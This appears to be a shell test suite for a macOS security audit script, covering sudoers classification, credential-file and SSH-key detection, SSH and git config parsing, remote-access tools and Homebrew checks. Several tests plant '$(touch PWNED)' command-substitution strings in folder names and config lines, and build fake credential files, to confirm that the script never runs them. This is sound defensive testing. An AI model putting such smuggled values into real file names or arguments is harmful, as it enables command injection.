check "G7 Runas list with a comma" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tw ALL'
check "G7 digest spec before a shell" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tu1 ALL'
check "G7 option spec before a shell" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tu2 ALL'
check "G7 digest and option specs before a program list it" has "$T/g7.out" $'MA-ACCOUNTS-006\tLOW\tu3 ALL = (root) NOPASSWD: SHA512:0a1b2c3d4e5f TIMEOUT=5 /usr/bin/ssh-keygen\t/usr/bin/ssh-keygen'
check "G7 full rule text kept" has "$T/g7.out" "b ALL = (root) NOPASSWD: /usr/bin/python3"
# G14: hidden accounts.
printf '%s\n' 'hadmin 502 yes' 'huser 503 no' '_sys 200 no' | hidden_findings > "$T/g14"
check "G14 hidden admin is MEDIUM" has "$T/g14" $'MA-ACCOUNTS-013\tMEDIUM\thadmin'
check "G14 hidden user is LOW" has "$T/g14" $'MA-ACCOUNTS-014\tLOW\thuser'
check "G14 system account ignored" hasnt "$T/g14" "_sys"
# G20: home folders.
( group_has_others() { [ "$1" = 20 ]; }
  [ -n "$(home_write_risk drwxrwxr-x 20 alice)" ] && [ -z "$(home_write_risk drwxrwxr-x 99 alice)" ] &&
  [ -n "$(home_write_risk drwxr-xrwx 99 alice)" ] && [ -z "$(home_write_risk drwxr-xr-x 20 alice)" ] )
check "G20 home folder writable by staff or everyone, not by a group without other members" [ $? -eq 0 ]
# G22: sudo file owner and mode.
check "G22 stock sudoers" [ -z "$(sudo_owner_risk /etc/sudoers 'root:wheel -r--r-----')" ]
check "G22 other owner" [ -n "$(sudo_owner_risk /etc/sudoers 'bob:wheel -r--r-----')" ]
check "G22 group-writable folder" [ -n "$(sudo_owner_risk /etc/sudoers.d 'root:wheel drwxrwxr-x')" ]
check "G22 sudo without setuid" [ -n "$(sudo_owner_risk /usr/bin/sudo 'root:wheel -r-x--x--x')" ]
check "G22 stock sudo" [ -z "$(sudo_owner_risk /usr/bin/sudo 'root:wheel -r-s--x--x')" ]

# G3: credential files. Presence, mode and inline-secret state only.
cred_home() { mkdir -p "$1/.aws" "$1/.docker" "$1/.kube" "$1/.config/gh"; }
H1="$T/h1"; cred_home "$H1"
printf 'machine x login u password SECRET_A\n' > "$H1/.netrc"
printf '[prof_SECRET]\naws_access_key_id = AKIDEXAMPLE\naws_secret_access_key = SECRET_B\n' > "$H1/.aws/credentials"
printf 'https://u:SECRET_C@github.com\n' > "$H1/.git-credentials"
printf '//registry.npmjs.org/:_authToken=SECRET_D\n' > "$H1/.npmrc"
printf '[pypi]\nusername = u\npassword = SECRET_E\n' > "$H1/.pypirc"
printf '{"auths":{"r":{"auth":"SECRET_F"}}}\n' > "$H1/.docker/config.json"
printf 'users:\n- name: x\n  user:\n    token: SECRET_G\n' > "$H1/.kube/config.real"; ln -s config.real "$H1/.kube/config"
printf 'github.com:\n    oauth_token: SECRET_H\n' > "$H1/.config/gh/hosts.yml"
chmod 644 "$H1/.netrc"
H2="$T/h2"; cred_home "$H2"
printf 'machine x login u\n' > "$H2/.netrc"
printf '[default]\naws_access_key_id = AKIDEXAMPLE\n' > "$H2/.aws/credentials"
: > "$H2/.git-credentials"
printf '//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n' > "$H2/.npmrc"
printf '[pypi]\nusername = u\n' > "$H2/.pypirc"
printf '{"credsStore":"osxkeychain"}\n' > "$H2/.docker/config.json"
printf 'users:\n- name: x\n  user:\n    exec: {}\n' > "$H2/.kube/config"
printf 'github.com:\n    user: u\n' > "$H2/.config/gh/hosts.yml"
cred_scan "$H1" > "$T/g3a"; cred_scan "$H2" > "$T/g3b"
check "G3 no secret value or profile name" [ -z "$(cat "$T/g3a" "$T/g3b" | grep -E 'SECRET|AKID|prof_')" ]
check "G3 eight files with an inline secret" [ "$(awk -F'\t' '$3 == "yes"' "$T/g3a" | grep -c .)" -eq 8 ]
check "G3 eight files without one" [ "$(awk -F'\t' '$3 == "no"' "$T/g3b" | grep -c .)" -eq 8 ]
check "G3 mode shown" has "$T/g3a" $'.netrc\t-rw-r--r--'
check "G3 symlinked file reports the target mode" [ "$(awk -F'\t' '$1 == ".kube/config" {print substr($2, 1, 10)}' "$T/g3a")" = "-rw-------" ]
# G4: SSH private keys from headers only.
K="$T/keys"; mkdir "$K"
ssh-keygen -q -t ed25519 -N '' -C SECRET_C1 -f "$K/plain"
ssh-keygen -q -t ed25519 -N 'test-passphrase' -f "$K/locked"
ssh-keygen -q -t rsa -b 2048 -m PEM -N '' -f "$K/pem_plain"
ssh-keygen -q -t rsa -b 2048 -m PEM -N 'test-passphrase' -f "$K/pem_locked"
ssh-keygen -q -t rsa -b 2048 -m PKCS8 -N 'test-passphrase' -f "$K/p8"
{ head -1 "$K/plain"; sed '1d;$d' "$K/plain" | tr -d '\n'; echo; tail -1 "$K/plain"; } > "$K/oneline"
cp "$K/plain" "$K/x.pub"; echo "not a key" > "$K/notes"
check "G4 OpenSSH none" [ "$(ssh_key_state "$K/plain")" = "no passphrase" ]
check "G4 OpenSSH with a passphrase" [ "$(ssh_key_state "$K/locked")" = passphrase ]
check "G4 PEM without ENCRYPTED" [ "$(ssh_key_state "$K/pem_plain")" = "no passphrase" ]
check "G4 PEM with ENCRYPTED" [ "$(ssh_key_state "$K/pem_locked")" = passphrase ]
check "G4 PKCS#8 encrypted" [ "$(ssh_key_state "$K/p8")" = passphrase ]
check "G4 one-line OpenSSH key" [ "$(ssh_key_state "$K/oneline")" = "no passphrase" ]
check "G4 not a key" [ -z "$(ssh_key_state "$K/notes")" ]
check "G4 private key named .pub is a private key" [ "$(ssh_key_state "$K/x.pub")" = "no passphrase" ]
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\r\nDUMMYBODYTEXT\r\n-----END OPENSSH PRIVATE KEY-----\r\n' > "$K/crlf.pub"
check "G4 CRLF private key named .pub is a private key" [ -n "$(ssh_key_state "$K/crlf.pub")" ]
check "G4 private-key function never runs ssh-keygen" [ -z "$(type ssh_key_state | grep ssh-keygen)" ]
check "G4 public summary has no comment" [ -z "$(ssh_pub_summary "$K/plain.pub" | grep SECRET)" ]
check "G4 public summary bits and type" [ "$(ssh_pub_summary "$K/plain.pub" | cut -f2,3)" = $'256\t(ED25519)' ]
# G5, G18: SSH client options, Include handling, and loops.
S="$T/ssh"; mkdir -p "$S/home/.ssh" "$S/inc"
cat > "$S/home/.ssh/config" <<EOF
ForwardAgent yes
Include $S/inc/*.conf
Include \$(touch $T/pwned)
Include ~/.ssh/config
Host secret-host.example
  StrictHostKeyChecking=no
Host *
  StrictHostKeyChecking off
EOF
printf 'Host other.example\n  ForwardAgent yes\n' > "$S/inc/a.conf"
( THOME="$S/home"; SSH_SEEN=""; ssh_cfg "$S/home/.ssh/config" 1 all ) > "$T/g5"
check "G5 option before the first Host applies to every host" has "$T/g5" "all ForwardAgent"
check "G5 Include outside ~/.ssh under a named host" has "$T/g5" "host ForwardAgent"
check "G5 Key=value under a named host" has "$T/g5" "host StrictHostKeyChecking"
check "G5 off under Host *" has "$T/g5" "all StrictHostKeyChecking"
check "G5 host names not in the output" hasnt "$T/g5" "example"
check "G18 self-include read once" [ "$(grep -c 'all ForwardAgent' "$T/g5")" -eq 1 ]
check "G18 Include text is never run" [ ! -e "$T/pwned" ]

# G6: git hooksPath; other sections, such as a [url] with a token, never print.
printf '[core]\n\thooksPath = ~/.githooks\n[url "https://SECRET_T@github.com/"]\n\tinsteadOf = https://github.com/\n' > "$T/gitconfig"
check "G6 hooksPath found" [ "$(git_hooks_path "$T/gitconfig")" = "~/.githooks" ]
check "G6 url token not printed" [ -z "$(git_hooks_path "$T/gitconfig" | grep SECRET)" ]

# P1 to P8: the 1.3.1 fixes.
printf '%s\n' '%admin ALL=NOPASSWD: /usr/sbin/httpd' '%admin ALL=NOPASSWD: /bin/kill' '%admin ALL=NOPASSWD: /usr/sbin/apachectl' | classify_sudoers > "$T/p1"
check "P1 httpd can run other code" has "$T/p1" $'MA-ACCOUNTS-009\tHIGH\t%admin ALL=NOPASSWD: /usr/sbin/httpd'
check "P1 apachectl can run other code" has "$T/p1" $'MA-ACCOUNTS-009\tHIGH\t%admin ALL=NOPASSWD: /usr/sbin/apachectl'
check "P1 kill stays LOW" has "$T/p1" $'MA-ACCOUNTS-006\tLOW\t%admin ALL=NOPASSWD: /bin/kill'
check "P1 dtrace can run other code" [ "$(printf '%s\n' 'x ALL=NOPASSWD: /usr/sbin/dtrace' | classify_sudoers | cut -f2)" = HIGH ]

cat > "$T/p2" <<'EOF'
  0 => {
    "date" => 2026-11-24 05:00:00 +0000
    "displayName" => ""
    "displayVersion" => "10.16.0"
    "packageIdentifiers" => [
      0 => "com.example.vpn"
      1 => "com.example.vpn.helper"
    ]
    "processName" => "installer"
  }
EOF
recent_installs 2026-10-25 < "$T/p2" > "$T/p2.out"
check "P2 empty display name falls back to the package ID" has "$T/p2.out" "2026-11-24  com.example.vpn 10.16.0"

printf '    XProtectPlistConfigData:\n\n      Version: 5370\n\n    XProtectPlistConfigData:\n\n      Version: 5377\n      Source: Apple\n\n    XProtectPayloads:\n\n      Version: 171\n' | xprotect_versions > "$T/p3"
check "P3 latest version of each XProtect component" [ "$(paste -sd, - < "$T/p3")" = "XProtectPayloads 171,XProtectPlistConfigData 5377" ]

printf '                 Name: Zoom\n                 Type: app (0x2)\n                 Name: Zoom\n                 Type: app (0x2)\n                 Name: Other\n                 Type: app (0x2)\n' | btm_unique > "$T/p4"
check "P4 repeated background items printed once" [ "$(grep -c 'Name: Zoom' "$T/p4")" -eq 1 ]
check "P4 other items kept" has "$T/p4" "Name: Other"

printf '  101 /Applications/Codex.app/Contents/Helpers/Codex (Aperitif).app/Contents/MacOS/Codex (Aperitif)\n  202 /usr/libexec/trustd\n' > "$T/psmap"
cat > "$T/p5" <<'EOF'
tcp4       0      0  192.168.1.5.50000      172.64.148.235.443     ESTABLISHED  131072  131072  10  0 Codex (Aperitif):101 00102 00000008 0000000000000001 00000000 00000800 1 0 000001 0
tcp4       0      0  192.168.1.5.50001      17.253.17.201.443      ESTABLISHED  131072  131072  10  0 trustd:202 00102 00000008 0000000000000002 00000000 00000800 1 0 000001 0
tcp4       0      0  192.168.1.5.50002      15.197.251.99.443      ESTABLISHED  131072  131072  10  0 Helper (R:303 00102 00000008 0000000000000003 00000000 00000800 1 0 000001 0
tcp4       0      0  127.0.0.1.50003        127.0.0.1.8021         ESTABLISHED  131072  131072  10  0 trustd:202 00102 00000008 0000000000000004 00000000 00000800 1 0 000001 0
EOF
outbound_conns "$T/psmap" < "$T/p5" > "$T/p5.out"
check "P5 name with spaces comes from ps" has "$T/p5.out" "Codex (Aperitif) 172.64.148.235"
check "P5 plain name" has "$T/p5.out" "trustd 17.253.17.201"
check "P5 unknown PID keeps the netstat name" has "$T/p5.out" "(R 15.197.251.99"
check "P5 local connections skipped" [ "$(grep -c . "$T/p5.out")" -eq 3 ]

check "P6 command words with spaces are quoted" [ "$(shown_cmd sh -c 'memory_pressure | tail -2' x)" = "sh -c 'memory_pressure | tail -2' x" ]
check "P6 single quote inside a word" [ "$(shown_cmd echo "it's")" = "echo 'it'\\''s'" ]
check "P6 plain words unquoted" [ "$(shown_cmd /usr/bin/tmutil listlocalsnapshots /)" = "/usr/bin/tmutil listlocalsnapshots /" ]

BODY="$T/p7"; : > "$BODY"
printf '' | block "Empty check"; printf '\n  \n' | block "Blank check"; printf 'a\n' | block "Full check"
check "P7 empty block says none" has "$T/p7" "- Empty check: none"
check "P7 blank block says none" has "$T/p7" "- Blank check: none"
check "P7 full block keeps its text" has "$T/p7" "**Full check**"
check "P7 one code block" [ "$(grep -c '^```text$' "$T/p7")" -eq 1 ]

THOME=/Users/bob
check "P8 user folder label" [ "$(nmh_label "/Users/bob/Library/Application Support/Google/Chrome/NativeMessagingHosts")" = "Google/Chrome" ]
check "P8 system Chrome folder label" [ "$(nmh_label /Library/Google/Chrome/NativeMessagingHosts)" = "Google/Chrome" ]
check "P8 system Mozilla folder label" [ "$(nmh_label "/Library/Application Support/Mozilla/NativeMessagingHosts")" = "Mozilla" ]

# Q1 and Q2: the 1.3.2 login-record fixes.
check "Q1 rules turn off set_utmp and keep use_pty" has "$T/f1" 'Defaults!MACASSAY always_set_home, !set_utmp'
check "Q1 no use_pty change" hasnt "$T/f1" "use_pty"
check "Q1 visudo accepts the rules" visudo_ok "$T/f1"

mkdir -p "$T/q2/open" "$T/q2/-x \$(touch PWNED) y"
chmod 755 "$T/q2/open"
( cd "$T/q2" && /bin/sh -c "$WRITABLE_SH" sh "$T/q2/open" /System "$T/q2/missing" "$T/q2/-x \$(touch PWNED) y" ) > "$T/q2.out"
check "Q2 writable folder printed" has "$T/q2.out" "$T/q2/open"
check "Q2 folder name with shell syntax printed unchanged" has "$T/q2.out" "$T/q2/-x \$(touch PWNED) y"
check "Q2 no command ran from a folder name" [ ! -e "$T/q2/PWNED" ]
check "Q2 read-only and missing folders skipped" [ "$(grep -c . "$T/q2.out")" -eq 2 ]
check "Q2 no arguments prints nothing" [ -z "$(/bin/sh -c "$WRITABLE_SH" sh)" ]

# Q3 to Q7: the 1.3.2 report fixes.
q3rec() { printf '  0 => {\n    "date" => 2026-11-20 05:00:00 +0000\n    "displayName" => "%s"\n' "$1"
  [ -n "$3" ] && printf '    "packageIdentifiers" => [\n      0 => "%s"\n    ]\n' "$3"
  printf '    "processName" => "%s"\n  }\n' "$2"; }
{ q3rec "Numbers" appstoreagent com.apple.pkg.Numbers16; q3rec "Xcode" appstored com.apple.pkg.Xcode
  q3rec "XProtectCloudKitUpdate" XProtectUpdateService ""; q3rec "macOS Update" softwareupdated com.apple.pkg.update
  q3rec "Command Line Tools" softwareupdate com.apple.pkg.CLTools_Executables; q3rec "macOS" bootinstalld com.apple.pkg.InstallAssistant
  q3rec "Store App" appstoreagent com.example.storeapp; q3rec "Fake Apple" installer com.apple.pkg.Fake
  q3rec "" Installer com.example.noname; q3rec "RosettaUpdateAuto" CoreServicesUIAgent com.apple.pkg.RosettaUpdateAuto; } | recent_installs 2026-10-25 > "$T/q3"
check "Q3 Apple installs dropped" [ -z "$(grep -E 'Numbers|Xcode|XProtect|macOS|Command Line|Rosetta' "$T/q3")" ]
check "Q3 third-party App Store app kept" has "$T/q3" "2026-11-20  Store App"
check "Q3 hand-installed com.apple. package kept" has "$T/q3" "2026-11-20  Fake Apple"
check "Q3 empty display name shows the package ID" has "$T/q3" "2026-11-20  com.example.noname"
check "Q3 three installs listed" [ "$(grep -c . "$T/q3")" -eq 3 ]

printf '%s\n' ' 369664   0.0  90145 averylongname1 /Applications/Google Chrome.app/Contents/MacOS/Google Chrome' '  12704   4.3    378 root     /usr/libexec/opendirectoryd' | top_mem > "$T/q4"
check "Q4 path with spaces in full" has "$T/q4" "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
check "Q4 plain path and columns" has "$T/q4" "     12 MB   4.3%    378 root       /usr/libexec/opendirectoryd"
check "Q4 MB column" has "$T/q4" "    361 MB   0.0%  90145 averylongname1 /Applications/Google"

printf '%s\n' /Library/Logs/DiagnosticReports/WindowServer_2026-11-24-094451_host.cpu_resource.diag \
  /Library/Logs/DiagnosticReports/WindowServer_2026-11-21-193818_host.cpu_resource.diag \
  /Library/Logs/DiagnosticReports/avconferenced-2026-11-20-101010.ips /Library/Logs/DiagnosticReports/JetsamEvent-2026-11-20-101010.ips \
  /Library/Logs/DiagnosticReports/ServiceExtension | crash_kinds > "$T/q5"
check "Q5 .diag reports grouped" has "$T/q5" "   2 WindowServer"
check "Q5 .ips reports grouped" has "$T/q5" "   1 avconferenced"
check "Q5 name without a date kept" has "$T/q5" "   1 ServiceExtension"
check "Q5 four kinds" [ "$(grep -c . "$T/q5")" -eq 4 ]

BODY="$T/q6"; : > "$BODY"; RULES="$T/q6.rules"; : > "$RULES"; SKIPS="$T/q6.skips"; : > "$SKIPS"
q6priv() { ( TMP="$T"; priv() { printf '%b' "$Q6OUT"; }; privblk "$1" label x ); }
Q6OUT='ssh-keygen: /Users/bob/.ssh/authorized_keys: No such file or directory\r\n' q6priv "Keys (bob)"
Q6OUT='ls: /Users/bob/Library/LaunchAgents: No such file or directory\n' q6priv "Agents (bob)"
Q6OUT='total 8\n-rw-r--r--  1 501  20  10 Nov 20 10:00 ok.plist\n-rw-r--r--  1 501  20  10 Nov 20 10:00 evil.plist: No such file or directory\n' q6priv "Agents (carol)"
Q6OUT='/Users/dave/.ssh/authorized_keys is not a public key file.\n' q6priv "Keys (dave)"
check "Q6 missing file ending in CR LF says none" has "$T/q6" "- Keys (bob): none"
check "Q6 missing folder says none" has "$T/q6" "- Agents (bob): none"
check "Q6 a file name cannot hide its own line" has "$T/q6" "evil.plist: No such file or directory"
check "Q6 other errors kept" has "$T/q6" "is not a public key file."

BODY="$T/q7"; : > "$BODY"
say "- a: b"; printf 'x\n' | block "Block title"; say "- c: d"; run "Run title" echo y
blank_before() { [ "$(awk -v t="**$1**" '$0 == t {print "[" prev "]"} {prev = $0}' "$T/q7")" = "[]" ]; }
check "Q7 blank line before a block title" blank_before "Block title"
check "Q7 blank line before a run title" blank_before "Run title"

# R1: installed remote-access tools from folder names. Names are matched as text, never run.
R1R="$T/r1root"; R1H="$T/r1home"
mkdir -p "$R1R/Applications/TeamViewer.app" "$R1R/Applications/RealVNC Viewer.app" "$R1R/Applications/Screens 5.app" \
  "$R1R/Applications/Jump Desktop.app" "$R1R/Applications/DaVinci Resolve.app" "$R1R/Applications/Zoho Mail.app" \
  "$R1R/Applications/.com.bomgar.scc.ab12cd34" "$R1R/Library/LaunchDaemons" "$R1R/Library/PrivilegedHelperTools/ChromeRemoteDesktopHost.bundle" \
  "$R1H/Library/LaunchAgents" "$R1R/Library/Application Support" "$R1R/opt"
: > "$R1R/Library/LaunchDaemons/com.teamviewer.teamviewer_service.plist"
: > "$R1H/Library/LaunchAgents/screenconnect-1a2b3c-onlogin.plist"
: > "$R1H/Library/LaunchAgents/-x \$(touch PWNED) logmein.plist"
: > "$R1R/Library/LaunchDaemons/AppleVNCServer.plist"
remote_places "$R1R" "$R1H" | remote_installed > "$T/ri1" 2> "$T/ri1.err"
check "R1 Chrome Remote Desktop helper alone" has "$T/ri1" $'Chrome Remote Desktop\thelper'
check "R1 TeamViewer once with app and daemon" [ "$(grep -c '^TeamViewer' "$T/ri1")" = 1 ]
check "R1 TeamViewer places" has "$T/ri1" $'TeamViewer\tapp, launch daemon'
check "R1 hidden BeyondTrust folder" has "$T/ri1" $'BeyondTrust (Bomgar)\tapp'
check "R1 ScreenConnect launch agent" has "$T/ri1" $'ConnectWise ScreenConnect\tlaunch agent'
check "R1 odd name matched as text" has "$T/ri1" $'LogMeIn\tlaunch agent'
check "R1 no PWNED file" not [ -e PWNED ]
check "R1 no PWNED file in the test folder" not [ -e "$T/PWNED" ]
for v in "RealVNC" "Screens" "Jump Desktop" "Resolve" "Zoho" "Apple"; do check "R1 $v viewer or other app gives nothing" hasnt "$T/ri1" "$v"; done
check "R1 five tools only" [ "$(grep -c . "$T/ri1")" = 5 ]
check "R1 items name each match with its place" has "$T/ri1" "app TeamViewer.app, launch daemon com.teamviewer.teamviewer_service.plist"

# R2: every tool with a process fragment is found running; Apple's services are not.
check "R2 Chrome Remote Desktop" [ "$(rs '/Library/PrivilegedHelperTools/ChromeRemoteDesktopHost.bundle/Contents/MacOS/remoting_me2me_host_service')" = "Chrome Remote Desktop" ]
check "R2 Parsec exact name" [ "$(rs /Applications/Parsec.app/Contents/MacOS/Parsec)" = Parsec ]
check "R2 Apple parsecd gives nothing" [ -z "$(rs /System/Library/PrivateFrameworks/CoreParsec.framework/parsecd)" ]
check "R2 JumpConnect" [ "$(rs '/Applications/Jump Desktop Connect.app/Contents/MacOS/JumpConnect')" = "Jump Desktop Connect" ]
check "R2 NoMachine nxserver.bin" [ "$(rs /Applications/NoMachine.app/Contents/Frameworks/bin/nxserver.bin)" = NoMachine ]
check "R2 TigerVNC still listed" [ "$(rs /usr/local/bin/tigervnc-server)" = TigerVNC ]
check "R2 two tools, sorted" [ "$(printf '%s\n' /a/AnyDesk /b/TeamViewer_Service /c/AnyDesk | remote_support_names | paste -sd, -)" = "AnyDesk,TeamViewer" ]

# R3: a tool installed but not running gives MA-SHARING-026, by how it can start.
R3IN=$'TeamViewer\tapp, launch daemon\tapp TeamViewer.app, launch daemon com.teamviewer.x.plist\nAnyDesk\tapp\tapp AnyDesk.app\nRustDesk\thelper\thelper com.carriez.h\nParsec\tapp\tapp Parsec.app\nZoho Assist\tapp\tapp ZohoAssist launch agent helper.app'
check "R3 launch daemon is MEDIUM" [ "$(printf '%s\n' "$R3IN" | remote_installed_findings "" | grep -c $'^MA-SHARING-026\tMEDIUM\tTeamViewer\t')" = 1 ]
check "R3 app alone is LOW" [ "$(printf '%s\n' "$R3IN" | remote_installed_findings "" | grep -c $'^MA-SHARING-026\tLOW\tAnyDesk\t')" = 1 ]
check "R3 helper is MEDIUM" [ "$(printf '%s\n' "$R3IN" | remote_installed_findings "" | grep -c $'^MA-SHARING-026\tMEDIUM\tRustDesk\t')" = 1 ]
check "R3 running tools give nothing" [ "$(printf '%s\n' "$R3IN" | remote_installed_findings "TeamViewer,Parsec" | cut -f3 | paste -sd, -)" = "AnyDesk,RustDesk,Zoho Assist" ]
check "R3 a name on disk cannot raise the severity" [ "$(printf '%s\n' "$R3IN" | remote_installed_findings "" | grep -c $'^MA-SHARING-026\tLOW\tZoho Assist\t')" = 1 ]
check "R3 the finding names the items" [ "$(printf '%s\n' "$R3IN" | remote_installed_findings "" | grep -c $'\tTeamViewer\tapp TeamViewer.app, launch daemon com.teamviewer.x.plist$')" = 1 ]

# R4: Find My off gives LOW with a battery, INFO without; on or unknown gives nothing.
check "R4 off with battery is LOW" [ "$(findmy_finding 0 1)" = $'MA-PLATFORM-019\tLOW' ]
check "R4 off without battery is INFO" [ "$(findmy_finding 0 0)" = $'MA-PLATFORM-019\tINFO' ]
check "R4 on gives nothing" [ -z "$(findmy_finding 1 1)" ]
check "R4 unknown gives nothing" [ -z "$(findmy_finding '' 1)" ]

# R5: casks that only --greedy reports.
check "R5 greedy only" [ "$(greedy_only $'a\nb' $'a\nb\nc\nd' | paste -sd, -)" = "c,d" ]
check "R5 empty plain list" [ "$(greedy_only '' $'c' | paste -sd, -)" = "c" ]
check "R5 no difference" [ -z "$(greedy_only $'a' $'a')" ]

# R6 and R8: Homebrew taps and cask apps from a fake prefix with receipts; no brew command runs.
BP="$T/brew"; mkdir -p "$BP/Library/Taps/acme/homebrew-tools" "$BP/Library/Taps/idle/homebrew-tap" "$BP/Library/Taps/homebrew/homebrew-core" \
  "$BP/Cellar/jq/1.7" "$BP/Cellar/widget/2.0" "$BP/Cellar/widget/1.0" "$BP/Cellar/broken/1" \
  "$BP/Caskroom/goodapp/.metadata" "$BP/Caskroom/rawapp/.metadata" "$BP/Caskroom/evil/.metadata" "$BP/Caskroom/cli/.metadata" "$T/apps"
printf '{"source":{"tap":"homebrew/core"}}' > "$BP/Cellar/jq/1.7/INSTALL_RECEIPT.json"
printf '{"source":{"tap":"acme/tools"}}' > "$BP/Cellar/widget/2.0/INSTALL_RECEIPT.json"
printf '{"source":{"tap":"acme/tools"}}' > "$BP/Cellar/widget/1.0/INSTALL_RECEIPT.json"
printf '{"source":' > "$BP/Cellar/broken/1/INSTALL_RECEIPT.json"
printf '{"source":{"tap":"homebrew/cask"},"uninstall_artifacts":[{"app":["Good.app"]},{"zap":[]}]}' > "$BP/Caskroom/goodapp/.metadata/INSTALL_RECEIPT.json"
printf '{"source":{"tap":"acme/tools"},"uninstall_artifacts":[{"app":["Raw.app",{"target":"Raw Renamed.app"}]}]}' > "$BP/Caskroom/rawapp/.metadata/INSTALL_RECEIPT.json"
printf '{"source":{"tap":"homebrew/cask"},"uninstall_artifacts":[{"app":["../escape.app"]},{"app":["a/b.app"]},{"app":[".hidden.app"]},{"app":["x\\tq.app"]}]}' > "$BP/Caskroom/evil/.metadata/INSTALL_RECEIPT.json"
printf '{"uninstall_artifacts":[{"binary":["cli"]}]}' > "$BP/Caskroom/cli/.metadata/INSTALL_RECEIPT.json"
# The unsafe names exist without quarantine, so only the name filter keeps them out of R8.
mkdir -p "$T/apps/Good.app" "$T/apps/Raw Renamed.app" "$T/apps/.hidden.app" "$T/apps/a/b.app" "$T/escape.app"; xattr -w com.apple.quarantine '0081;00000000;Test;' "$T/apps/Good.app"
brew_receipts "$BP" > "$T/r6rec"; brew_taps "$BP" > "$T/r6taps"
mkdir -p "$T/intel/Homebrew/bin" "$T/intel/bin" "$BP/bin"; : > "$T/intel/Homebrew/bin/brew"; ln -s ../Homebrew/bin/brew "$T/intel/bin/brew"; : > "$BP/bin/brew"
check "R6 repository behind a bin/brew link (Intel layout)" [ "$(brew_repo "$T/intel/bin/brew")" = "$(cd "$T/intel/Homebrew" && pwd -P)" ]
check "R6 repository is the prefix when bin/brew is a file" [ "$(brew_repo "$BP/bin/brew")" = "$(cd "$BP" && pwd -P)" ]
ln -s loop "$T/intel/bin/loop"
check "R6 a symlink loop ends" [ -n "$(brew_repo "$T/intel/bin/loop")" ]
check "R6 receipts skip a broken file" hasnt "$T/r6rec" "broken"
check "R6 cask app target used" has "$T/r6rec" $'cask\trawapp\tacme/tools\tRaw Renamed.app'
check "R6 cask with no tap and no app" has "$T/r6rec" $'cask\tcli\t-\t-'
check "R6 tab in a name cannot add a field" [ "$(awk -F'\t' 'NF != 4' "$T/r6rec" | wc -l | tr -d ' ')" = 0 ]
check "R6 taps exclude homebrew" [ "$(paste -sd, "$T/r6taps")" = "acme/tools,idle/tap" ]
tap_packages "$(cat "$T/r6taps")" < "$T/r6rec" > "$T/r6tp"
check "R6 tap packages, each once" has "$T/r6tp" $'acme/tools\trawapp, widget'
check "R6 idle tap listed empty" grep -qx $'idle/tap\t' "$T/r6tp"
check "R6 core packages not listed" hasnt "$T/r6tp" "jq"
tap_findings < "$T/r6tp" > "$T/r6f"
check "R6 idle tap gives MA-UPDATES-009" grep -q $'^MA-UPDATES-009\tLOW\t.*idle/tap' "$T/r6f"
check "R6 tap packages give one MA-UPDATES-010" [ "$(grep -c $'^MA-UPDATES-010\tINFO\t2 installed' "$T/r6f")" = 1 ]
cask_unquarantined "$T/apps" < "$T/r6rec" > "$T/r8"
check "R8 app without quarantine listed" has "$T/r8" "$T/apps/Raw Renamed.app (rawapp)"
check "R8 quarantined app not listed" hasnt "$T/r8" "Good.app"
check "R8 unsafe names skipped" [ "$(grep -c . "$T/r8")" = 1 ]

# R7: Homebrew settings by name and source only; no line text or value reaches the output.
printf '%s\n' '# HOMEBREW_NO_INSECURE_REDIRECT=1' 'https_proxy=http://user:secret@proxy:8080' '  HOMEBREW_VERIFY_ATTESTATIONS=1' > "$T/r7a"
printf '%s\n' 'HOMEBREW_NO_VERIFY_ATTESTATIONS=' 'HOMEBREW_GITHUB_API_TOKEN=secret' > "$T/r7b"
# shellcheck disable=SC2016  # $1 and $2 expand in the inner shell, which gets the paths as arguments
env -u HOMEBREW_NO_INSECURE_REDIRECT -u HOMEBREW_VERIFY_ATTESTATIONS HOMEBREW_NO_VERIFY_ATTESTATIONS=1 bash -c 'MACASSAY_LIB=1 . ./macassay; brew_settings "$1" "$2" /nonexistent/brew.env' sh "$T/r7a" "$T/r7b" > "$T/r7"
check "R7 set in a file" has "$T/r7" "- HOMEBREW_VERIFY_ATTESTATIONS: set ($T/r7a)"
check "R7 set in the environment, empty in a file" has "$T/r7" "- HOMEBREW_NO_VERIFY_ATTESTATIONS: set (environment)"
check "R7 commented out is not set" has "$T/r7" "- HOMEBREW_NO_INSECURE_REDIRECT: not set"
check "R7 no secret" hasnt "$T/r7" "secret"
check "R7 three lines" [ "$(grep -c . "$T/r7")" = 3 ]

# R9: section status line on stderr, counts only.
FIND="$T/r9f"; SKIPS="$T/r9s"; BODY="$T/r9b"; : > "$FIND"; : > "$SKIPS"; : > "$BODY"
# shellcheck disable=SC2034  # sect_end, sourced from macassay, reads SECT_T
SECT_T=""
{ h2 "3. Updates and installs"
  finding MA-X-001 MEDIUM X "secret text one"; finding MA-X-002 LOW X "secret text two"; skip "a check" "a reason"
  h2 "4. Platform security"; sect_end; } 2> "$T/r9"
check "R9 status line" grep -qE '^\[3/14\] Updates and installs: 2 findings \(1 MEDIUM, 1 LOW\), 1 check skipped, [0-9]+ s$' "$T/r9"
check "R9 empty section" grep -qE '^\[4/14\] Platform security: 0 findings, 0 checks skipped, [0-9]+ s$' "$T/r9"
check "R9 no finding text" hasnt "$T/r9" "secret text"
total_status 2> "$T/r9t"
check "R9 total line" grep -qE '^Total: 2 findings \(1 MEDIUM, 1 LOW\), 1 check skipped, [0-9]+ s$' "$T/r9t"
check "R9 minutes" [ "$(dur 184)" = "3 min 4 s" ]

# R10: severity counts in the header, and the section count.
printf 'HIGH\tA\tX\tt\nHIGH\tB\tX\tt\nMEDIUM\tC\tX\tt\nLOW\tD\tX\tt\nLOW\tE\tX\tt\nLOW\tF\tX\tt\n' > "$T/r10"
check "R10 header counts" [ "$(sev_header "$T/r10")" = "- Findings: **2 HIGH**, **1 MEDIUM**, 3 LOW, 0 INFO" ]
: > "$T/r10e"
check "R10 no findings" [ "$(sev_header "$T/r10e")" = "- Findings: none" ]
check "R10 section count" [ "$(grep -cE '^h2 "[0-9]+\. ' macassay)" = "$NSECT" ]

# N1: the report opens with the data notice, right after the title, and states it only there.
# shellcheck disable=SC2016  # the expected value is the literal source line, with $REPORT_NOTICE unexpanded
check "N1 notice follows the title" [ "$(awk '/echo "# Mac health and security audit/ {getline; getline; print; exit}' macassay)" = '  echo "$REPORT_NOTICE"' ]
